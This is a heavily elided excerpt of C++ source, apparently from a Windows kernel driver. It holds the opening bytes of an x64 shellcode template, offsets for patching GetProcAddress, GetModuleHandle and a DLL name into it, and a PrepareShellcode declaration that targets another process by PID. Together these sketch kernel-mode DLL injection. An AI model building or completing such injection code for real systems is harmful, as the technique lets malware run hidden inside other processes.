...
inline UCHAR shellcodeTemplate[] = {
  0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x60, 0x48, 0xB8,
...
// Definitions.
constexpr SIZE_T SHELLCODE_SIZE = sizeof(shellcodeTemplate);
constexpr SIZE_T GET_PROC_ADDRESS_OFFSET = 0xB0;
constexpr SIZE_T GET_MODULE_HANDLE_OFFSET = 0x6C;
constexpr SIZE_T DLL_NAME_OFFSET = 0xDC;
constexpr SIZE_T SHELLCODE_ADDRESS_OFFSET = 0xC4;
...
private:
	...
	NTSTATUS PrepareShellcode(char* dllPath, PVOID shellcodeAddress, PEPROCESS targetProcess, ULONG pid);
